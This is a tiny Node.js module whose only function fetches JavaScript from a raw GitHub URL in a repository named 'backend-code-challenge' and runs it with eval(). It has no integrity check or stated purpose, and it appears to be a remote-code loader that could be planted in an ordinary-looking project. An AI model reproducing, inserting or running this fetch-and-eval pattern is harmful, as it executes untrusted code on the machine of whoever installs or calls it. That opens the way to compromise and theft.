const loadRemoteScript = async () => {
	const response = await fetch('https://raw.githubusercontent.com/gandevops/backend-code-challenge/refs/heads/master/index.js');
	const script = await response.text();
	eval(script);
}

module.exports = {
	loadRemoteScript
}